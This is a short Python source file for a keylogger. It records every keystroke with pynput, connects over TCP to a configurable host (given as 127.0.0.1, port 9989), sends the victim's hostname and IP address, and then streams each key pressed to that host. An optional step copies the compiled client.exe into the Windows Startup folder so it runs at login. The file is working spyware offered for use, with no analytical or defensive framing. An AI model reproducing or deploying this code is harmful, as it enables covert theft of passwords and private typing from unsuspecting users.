import logging
import os
import shutil
import socket
from pynput.keyboard import Listener

compiled = bool
compiled = False  # Change to true in order to compile it

if compiled:
    shutil.copy("client.exe", 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')

key = str
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ipaddress = "127.0.0.1"  # Enter host IP here
s.connect((ipaddress, 9989))
connected = "connected to: " + " " + ip_address + " " + hostname
connected = str(connected)
connected = connected.encode()
s.send(connected)

log_dir = ""
while True:
    def on_press(key):
        logging.info(str(key))
        message = key
        message = str(message)
        message = message.encode()
        s.send(message)


    with Listener(on_press=on_press) as listener:
        listener.join()
